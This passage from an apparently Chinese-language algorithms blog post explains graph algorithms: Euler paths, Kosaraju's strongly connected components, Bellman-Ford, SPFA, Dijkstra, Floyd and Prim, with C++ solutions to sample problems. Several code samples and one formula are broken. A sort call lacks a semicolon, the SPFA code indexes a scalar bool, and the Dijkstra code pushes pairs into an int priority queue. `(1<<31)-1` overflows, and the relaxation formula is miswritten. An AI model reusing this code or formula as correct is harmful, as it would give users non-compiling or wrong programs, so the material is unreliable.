class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="type">int</span> u,v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        cin&gt;&gt;u&gt;&gt;v;</span><br><span class="line">        edge[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">        outd[u]++;ind[v]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(edge[i].<span class="built_in">begin</span>(),edge[i].<span class="built_in">end</span>())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> start = <span class="built_in">isEular</span>();</span><br><span class="line">    <span class="keyword">if</span>(start&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(start);</span><br><span class="line">        <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            cout&lt;&lt;s.<span class="built_in">top</span>()&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="强连通分量"><a href="#强连通分量" class="headerlink" title="强连通分量"></a>强连通分量</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><p>强连通分量就是对于一个图，根据可达关系对图内的节点进行聚类操作，要求分量内的<strong>任意两点相互可达</strong>，而且这个分量是<strong>最大的子集</strong>（即新加入一个其他节点就会破坏这种强连通性）。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-9.png"></p>
<p>上图中存在 4 个强连通分量</p>
<h3 id="算法流程-2"><a href="#算法流程-2" class="headerlink" title="算法流程"></a>算法流程</h3><p>这里介绍 Kosaraju 算法求解强连通分量。</p>
<p>Kosaraju 算法分为几个步骤：</p>
<ol>
<li>把边反向，得到反向图 $G^R$</li>
<li>在 $G^R$ 上执行 DFS，得到顶点完成时刻顺序 $L$ （即这个顶点可达的顶点全被访问过，就加入 $L$ ）</li>
<li>在 $G$ 上按照 $L$ 逆序执行 DFS，得到强连通分量</li>
</ol>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-10.png"></p>
<p>例题：</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-11.png"></p>
<p>强联通分量模板题，根据上面的算法内容写代码即可，没什么 skills。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10005</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; g[N], rg[N];</span><br><span class="line"><span class="type">bool</span> vis[N];</span><br><span class="line"><span class="type">int</span> L[N];</span><br><span class="line"><span class="type">int</span> n,m,k;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    vis[u]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rg[u].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[rg[u][i]])&#123;</span><br><span class="line">            <span class="built_in">dfs1</span>(rg[u][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L[++k]=u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">    vis[u]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;g[u].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[g[u][i]])&#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(g[u][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        g[i].<span class="built_in">clear</span>();</span><br><span class="line">        rg[i].<span class="built_in">clear</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(L,<span class="number">0</span>,<span class="built_in">sizeof</span>(L));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m&amp;&amp;n)&#123;</span><br><span class="line">        <span class="built_in">init</span>();</span><br><span class="line">        <span class="type">int</span> u,v;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            cin&gt;&gt;u&gt;&gt;v;</span><br><span class="line">            g[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">            rg[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[i])</span><br><span class="line">                <span class="built_in">dfs1</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n; i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[L[i]])&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="built_in">dfs2</span>(L[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt==<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最短路径算法"><a href="#最短路径算法" class="headerlink" title="最短路径算法"></a>最短路径算法</h2><p>最短路径就是在图中，给定起点和终点，求起点到终点开销最小的路径。</p>
<p>存在最短路径的充要条件是最小路径不通过负环（因为负环有可能和最小路径不连通，这个时候就存在最短路径）。</p>
<p>对于没有负环的图，假设有 $n$ 个点，最短路径不会经过重复的顶点或者边，所以最短路径最多经过 $n$ 个点，最多经过 $n-1$条边。</p>
<h3 id="Bellman-Ford-算法"><a href="#Bellman-Ford-算法" class="headerlink" title="Bellman-Ford 算法"></a>Bellman-Ford 算法</h3><h4 id="基本算法"><a href="#基本算法" class="headerlink" title="基本算法"></a>基本算法</h4><p>贝尔曼福特算法的核心思想就是<strong>松弛操作</strong>，松弛操作就是遍历过程中每次都尝试更新所有关联的边，假设遍历到边$(u,v)$，松弛公式如下：</p>
<p>$$ dist(u) &#x3D; min(dist(u),dist(u)+w(u,v)) $$</p>
<p>大体思路很简单，遍历所有边，然后根据这个边去松弛其他所有边，整个遍历过程要迭代。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-12.png"></p>
<ul>
<li>如何保证贝尔曼福特算法一定结束</li>
</ul>
<p>在最短路能够找到的情况下，从起始点开始，最多进行 $n-1$ 次迭代，因为每次迭代，都代表源点的探索多了一层（多探索到至少一个节点），最多 $n-1$ 个节点，所以最多迭代 $n-1$ 次就能找到最短路（涵盖了所有情况）</p>
<ul>
<li>贝尔曼福特算法的复杂度</li>
</ul>
<p>由于进行 $n$ 次迭代，每次迭代都要遍历所有 $m$ 条边，所以复杂度为 $O(m*n)$</p>
<ul>
<li>如何判断达到了负环</li>
</ul>
<p>如果发现迭代了 $n$ 次以上，就 break 掉，然后判断图中出现了负环。</p>
<h4 id="标程例题"><a href="#标程例题" class="headerlink" title="标程例题"></a>标程例题</h4><p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-13.png"></p>
<p>标程，细节就是由于 $max(\sum w) &#x3D; 2^{31}$，这是一个很大的数，要记得开 <code>longlong</code> 类型防止 <code>int</code> 类型溢出了，且因为这个题没有负权边，所以不用考虑负环找不到的最短路的情况。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M = <span class="number">500010</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,m,s;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dist[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b,w;</span><br><span class="line">&#125;edges[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bellman_ford</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dist[i] = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dist[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="type">bool</span> relaxed = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="type">int</span> a=edges[j].a;</span><br><span class="line">            <span class="type">int</span> b=edges[j].b;</span><br><span class="line">            <span class="type">int</span> w=edges[j].w;</span><br><span class="line">            <span class="keyword">if</span>(dist[b]&gt;dist[a]+w)&#123;</span><br><span class="line">                dist[b]=dist[a]+w;</span><br><span class="line">                relaxed=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!relaxed) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里如果存在负环的话要记得写一个逻辑返回-1</span></span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        edges[i]=&#123;a,b,w&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">bellman_ford</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dist[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SPFA-队列优化"><a href="#SPFA-队列优化" class="headerlink" title="SPFA 队列优化"></a>SPFA 队列优化</h4><p>Bellman-Ford 算法是可以进行优化的，我们看到标准的贝尔曼福特算法中是固定的 pattern，他每次迭代都会遍历所有边，但这个遍历操作实际上是没必要的，因为并不是所有边都会有机会松弛。</p>
<p>SPFA 优化就是根据当前松弛的结果，将下一次可能会松弛的节点对应的边加入一个<strong>队列</strong>当中，依据就是，<strong>只有在本次松弛受到影响节点（更新过距离节点），下一次才可能发生松弛</strong>。</p>
<p>但是 SPFA 由于不会每次都访问所有边，所以它默认不能判断是否有负环，如果要判断，要加一个 <code>pre</code> 数组记录路径。</p>
<p>同样是和上面一样的题，给一个 SPFA 优化后的代码，使用队列实现</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10010</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; PII;</span><br><span class="line"><span class="type">int</span> n,m,s;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dist[N];</span><br><span class="line">vector&lt;PII&gt; edges[N];</span><br><span class="line"><span class="type">bool</span> vis = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SPFA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dist[i] = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dist[s]=<span class="number">0</span>;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line">    que.<span class="built_in">push</span>(s);</span><br><span class="line">    vis[s] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> u = que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        vis[u] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edges[u].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="type">int</span> v = edges[u][i].first;</span><br><span class="line">            <span class="type">int</span> w = edges[u][i].second;</span><br><span class="line">            <span class="keyword">if</span>(dist[v]&gt;dist[u]+w)&#123;</span><br><span class="line">                dist[v] = dist[u]+w;</span><br><span class="line">                <span class="keyword">if</span>(!vis[v])&#123;</span><br><span class="line">                    que.<span class="built_in">push</span>(v);</span><br><span class="line">                    vis[v] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        edges[a].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(b,w));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SPFA</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dist[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h3><h4 id="基本算法-1"><a href="#基本算法-1" class="headerlink" title="基本算法"></a>基本算法</h4><p>Dijkstra 算法用于求<strong>无负权边</strong>的最短路径。算法的流程就是维护一个顶点集合 $\alpha$，每一轮将<strong>离起点最近</strong>的顶点加入 $\alpha$ 当中，并根据这个点的边<strong>做松弛操作</strong>。直到所有点被加入到 $\alpha$ 中。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-14.png"></p>
<p>可优化的点是，这个离起点最近的点可以使用优先队列进行优化，就可以省去排序的复杂度，复杂度为 $O(mlogn)$，优化前的复杂度为 $O(n^2 + m)$</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>例题还是这个</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-15.png"></p>
<p>这里要开一个优先队列存取节点信息（与源点的距离和这个点的编号），这里要注意的是我们使用一个 <code>pair</code> 去来表示节点信息，优先队列默认是对 <code>pair</code> 的 <code>first</code> 节点做排序匹配的，要记得把距离放在 <code>first</code>。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10010</span>;</span><br><span class="line"><span class="type">int</span> n,m,s;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dist[N];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; PII;</span><br><span class="line">vector&lt;PII&gt; edges[N];</span><br><span class="line"><span class="type">bool</span> vis[N] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dijkstra</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dist[i] = (<span class="number">1</span>&lt;&lt;<span class="number">31</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dist[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//小根堆</span></span><br><span class="line">    priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,greater&lt;<span class="type">int</span>&gt; heap;</span><br><span class="line">    heap.<span class="built_in">push</span>(&#123;<span class="number">0</span>,s&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!heap.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> top = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> u = top.second;</span><br><span class="line">        <span class="type">int</span> dis = top.first;</span><br><span class="line">        <span class="keyword">if</span>(vis[u])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        vis[u] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edges[u].<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="type">int</span> v = edges[u][i].second;</span><br><span class="line">            <span class="type">int</span> w = edges[u][i].first;</span><br><span class="line">            <span class="keyword">if</span>(dist[v]&gt;dis + w)&#123;</span><br><span class="line">                dist[v] = dis+w;</span><br><span class="line">                heap.<span class="built_in">push</span>(&#123;dist[v],v&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        edges[a].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(w,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Dijkstra</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dist[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="多源汇最短路径-Floyd-算法"><a href="#多源汇最短路径-Floyd-算法" class="headerlink" title="多源汇最短路径 - Floyd 算法"></a>多源汇最短路径 - Floyd 算法</h3><p>多源汇最短路径就是求所有点的最短路径，因为贝尔曼福特和Dijkstra 算法都是针对单源路径的，他们的复杂度会和边数 $m$ 有关，如果在乘上一个 $n$ 会导致复杂度很高。</p>
<p>Floyd 算法能够一次性出求多源汇最短路径，他的复杂度为 $O(n^3)$，算法的基本思想是开一个邻接矩阵，然后枚举每一个点为<strong>松弛过程中的中间点</strong>的情况下，再去遍历所有边：</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-16.png"></p>
<p>例题</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-17.png"></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> dist[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Floyd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>; k&lt;=n; k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                dist[i][j] = <span class="built_in">min</span>(dist[i][j],dist[i][k]+dist[k][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">memset</span>(dist,<span class="number">0x3f</span>,<span class="built_in">sizeof</span>(dist));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==j)&#123;</span><br><span class="line">                dist[i][j]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> a,b,w;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;</span><br><span class="line">        dist[a][b]=w;</span><br><span class="line">        dist[b][a]=w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Floyd</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            cout&lt;&lt;dist[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最小生成树算法"><a href="#最小生成树算法" class="headerlink" title="最小生成树算法"></a>最小生成树算法</h2><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><p>生成树就是由母图派生出的一条连通路径，满足树的结构，树一般情况下是没有回路的图（只有一种情况：树可以为空，但是图不行，所以严格来说树并不包含于图）。对于一个 $n$ 阶 $m$ 条边的图，其生成树满足 $m&#x3D;n-1$。</p>
<p>最小生成树就是<strong>有权无向连通图</strong>中边权和最小的生成树。</p>
<h3 id="Prim-算法求解最小生成树"><a href="#Prim-算法求解最小生成树" class="headerlink" title="Prim 算法求解最小生成树"></a>Prim 算法求解最小生成树</h3><p>和 Dijkstra 算法类似，都是维护一个顶点集，然后从初始顶点开始遍历，每次<strong>选择边权最小的节点跳转并加入顶点集，此时的状态就是在这个节点，然后根据这个节点的边去更新距离</strong>。重复以上过程，直到没有点加入顶点集，算法结束，如果此时所有点都在集合内，则说明找到了最小生成树。</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-18.png"></p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-19.png"></p>
<p>Prim 算法的复杂度为 $O(n^2+m)$</p>
<p>例题：</p>
<p><img src="/2023/12/30/%E7%AE%97%E6%B3%95-%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/image-20.png"></p>
<p>标程题，注意他这里要输出最小生成树的边权和，所以迭代过程中直接加上权值就好。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; PII;</span><br><span class="line">vector&lt;PII&gt; edges[N];</span><br><span class="line"><span class="type">bool</span> vis[N]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Prim</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(dist,<span class="number">127</span>,<span class="built_in">sizeof</span>(dist));</span><br><span class="line">    dist[<span 